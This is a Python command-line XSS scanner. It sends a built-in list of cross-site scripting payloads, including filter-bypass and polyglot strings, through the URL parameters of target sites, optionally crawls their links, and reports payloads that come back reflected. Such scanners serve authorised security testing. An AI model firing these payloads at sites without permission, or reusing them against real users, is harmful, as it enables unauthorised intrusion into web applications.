#!/usr/bin/env python3
"""
XSS (Cross-Site Scripting) Vulnerability Scanner
Author: [Your Name]
"""

import requests
import argparse
from urllib.parse import urlparse, urljoin, parse_qs
from bs4 import BeautifulSoup

def print_banner():
    print("""
__  ___ ___ ___ 
\ \/ / __/ __| _ \ ___ _ __ ___  ___ 
 >  <\__ \__ \   / -_) '_ (_-< / -_)
/_/\_\___/___/_|_\___| .__/__/_/\___|
                     |_|              
  Advanced XSS Vulnerability Scanner
  """)

# Comprehensive XSS payloads
PAYLOADS = [
    # Basic payloads
    "<script>alert('XSS')</script>",
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    
    # Obfuscated payloads
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=x oneonerrorrror=alert('XSS')>",
    "<img src=x:alert(alt) onerror=eval(src)>",
    
    # DOM-based payloads
    "'-alert(1)-'",
    "\"-alert(1)-\"",
    "javascript:alert(document.domain)",
    
    # Event handlers
    "<body onload=alert('XSS')>",
    "<input type=text value=`` onfocus=alert('XSS') autofocus>",
    
    # SVG payloads
    "<svg><script>alert('XSS')</script></svg>",
    
    # Bypass attempts
    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
    "<<script>script>alert('XSS')<</script>/script>",
    
    # Advanced payloads
    "<iframe srcdoc='<script>alert(`XSS`)</script>'>",
    "<details/open/ontoggle=alert('XSS')>",
    
    # Polyglot payloads
    "jaVasCript:/*-/*`/*\`/*'/*\"/**/(alert('XSS'))//",
]

def scan_url(url, payloads, params=None, headers=None, insecure=False, method="GET"):
    try:
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # If no specific parameters provided, test all
        test_params = params if params else query_params.keys()
        
        vulnerabilities = []
        
        for param in test_params:
            for payload in payloads:
                # Prepare test parameters
                test_params = query_params.copy()
                test_params[param] = [payload]
                
                # Make the request
                verify = not insecure
                
                if method.upper() == "GET":
                    response = requests.get(
                        url,
                        params=test_params,
                        headers=headers,
                        verify=verify
                    )
                else:
                    response = requests.post(
                        url,
                        data=test_params,
                        headers=headers,
                        verify=verify
                    )
                
                # Check if payload is reflected and unencoded
                if is_payload_reflected(response.text, payload):
                    vulnerabilities.append({
                        'url': response.url,
                        'parameter': param,
                        'payload': payload,
                        'method': method,
                        'response_code': response.status_code
                    })
        
        return vulnerabilities
    
    except Exception as e:
        print(f"[!] Error scanning {url}: {str(e)}")
        return []

def is_payload_reflected(response_text, payload):
    # Basic check for reflection
    if payload in response_text:
        return True
    
    # Check with HTML parsing
    soup = BeautifulSoup(response_text, 'html.parser')
    
    # Check in script tags
    for script in soup.find_all('script'):
        if payload in script.string:
            return True
    
    # Check in attributes
    for tag in soup.find_all():
        for attr in tag.attrs:
            if isinstance(tag[attr], list):
                for value in tag[attr]:
                    if payload in value:
                        return True
            elif payload in str(tag[attr]):
                return True
    
    return False

def crawl_links(base_url, headers=None, insecure=False):
    try:
        verify = not insecure
        response = requests.get(base_url, headers=headers, verify=verify)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        links = set()
        
        for link in soup.find_all('a', href=True):
            href = link['href']
            absolute_url = urljoin(base_url, href)
            if urlparse(absolute_url).netloc == urlparse(base_url).netloc:
                links.add(absolute_url)
        
        return list(links)
    
    except Exception as e:
        print(f"[!] Error crawling {base_url}: {str(e)}")
        return []

def main():
    print_banner()
    
    parser = argparse.ArgumentParser(description="XSS Vulnerability Scanner")
    parser.add_argument("-u", "--url", help="Target URL (e.g., https://example.com/page?param=test)")
    parser.add_argument("-f", "--file", help="File containing list of URLs")
    parser.add_argument("-p", "--param", action="append", help="Specific parameter(s) to test")
    parser.add_argument("-H", "--header", action="append", help="Additional headers (e.g., -H 'Cookie: abc=123')")
    parser.add_argument("--insecure", action="store_true", help="Disable SSL verification")
    parser.add_argument("--method", choices=["GET", "POST"], default="GET", help="HTTP method to use")
    parser.add_argument("--crawl", action="store_true", help="Crawl the website and test all links")
    parser.add_argument("--payload", action="append", help="Custom payload(s) to test")
    parser.add_argument("--payload-file", help="File containing custom payloads")
    
    args = parser.parse_args()
    
    if not args.url and not args.file:
        parser.print_help()
        return
    
    # Process headers
    headers = {}
    if args.header:
        for header in args.header:
            key, value = header.split(":", 1)
            headers[key.strip()] = value.strip()
    
    # Prepare payloads
    payloads = PAYLOADS.copy()
    if args.payload:
        payloads.extend(args.payload)
    if args.payload_file:
        with open(args.payload_file) as f:
            payloads.extend([line.strip() for line in f if line.strip()])
    
    # Test single URL
    if args.url:
        if args.crawl:
            print(f"[*] Crawling {args.url} for links...")
            links = crawl_links(args.url, headers, args.insecure)
            print(f"[*] Found {len(links)} links to test")
            
            for link in links:
                print(f"\n[*] Testing {link}")
                vulnerabilities = scan_url(
                    link,
                    payloads,
                    args.param,
                    headers,
                    args.insecure,
                    args.method
                )
                
                if vulnerabilities:
                    print("\n[+] XSS vulnerabilities found:")
                    for vuln in vulnerabilities:
                        print(f"  URL: {vuln['url']}")
                        print(f"  Parameter: {vuln['parameter']}")
                        print(f"  Payload: {vuln['payload']}")
                        print(f"  Method: {vuln['method']}")
                        print(f"  Status Code: {vuln['response_code']}\n")
                else:
                    print("[-] No XSS vulnerabilities found")
        else:
            vulnerabilities = scan_url(
                args.url,
                payloads,
                args.param,
                headers,
                args.insecure,
                args.method
            )
            
            if vulnerabilities:
                print("\n[+] XSS vulnerabilities found:")
                for vuln in vulnerabilities:
                    print(f"  URL: {vuln['url']}")
                    print(f"  Parameter: {vuln['parameter']}")
                    print(f"  Payload: {vuln['payload']}")
                    print(f"  Method: {vuln['method']}")
                    print(f"  Status Code: {vuln['response_code']}\n")
            else:
                print("[-] No XSS vulnerabilities found")
    
    # Test multiple URLs from file
    if args.file:
        with open(args.file) as f:
            urls = [line.strip() for line in f if line.strip()]
        
        for url in urls:
            print(f"\n[*] Testing {url}")
            vulnerabilities = scan_url(
                url,
                payloads,
                args.param,
                headers,
                args.insecure,
                args.method
            )
            
            if vulnerabilities:
                print("\n[+] XSS vulnerabilities found:")
                for vuln in vulnerabilities:
                    print(f"  URL: {vuln['url']}")
                    print(f"  Parameter: {vuln['parameter']}")
                    print(f"  Payload: {vuln['payload']}")
                    print(f"  Method: {vuln['method']}")
                    print(f"  Status Code: {vuln['response_code']}\n")
            else:
                print("[-] No XSS vulnerabilities found")

if __name__ == "__main__":
    main()
